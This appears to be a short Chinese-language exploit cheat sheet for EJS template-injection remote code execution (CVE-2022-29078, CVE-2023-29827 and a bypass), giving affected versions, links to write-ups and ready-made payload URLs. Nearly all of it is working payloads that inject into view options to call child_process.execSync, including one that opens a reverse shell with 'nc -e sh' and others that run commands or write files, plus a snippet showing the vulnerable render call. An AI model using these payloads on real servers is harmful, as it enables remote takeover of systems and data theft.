## CVE-2022-29078
适用条件
> ejs <= 3.1.6

[Ejs模板引擎注入实现RCE - 先知社区](https://xz.aliyun.com/t/12323#toc-9)<br />[EJS, Server side template injection RCE (CVE-2022-29078) - writeup](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
```python
http://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
```

## CVE-2023-29827
适用条件
> ejs <= 3.1.9

[EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) · Issue #735 · mde/ejs](https://github.com/mde/ejs/issues/735)
```python
http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
```
# 另外一个Payload
适用条件
> ejs <= 3.1.9

[ejs RCE CVE-2022-29078 bypass - inHann的博客 | inHann’s Blog](https://inhann.top/2023/03/26/ejs/)
```python
?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync("touch /tmp/3.txt");&settings[view%20options][client]=true
```
```javascript
o = {
  "settings":{
    "view options":{
      "escapeFunction":'console.log;this.global.process.mainModule.require("child_process").execSync("touch /tmp/pwned");',
      "client":"true"
    }
  }
}

app.get("/test",function (req,resp){
  return resp.render("test",o);
})
```
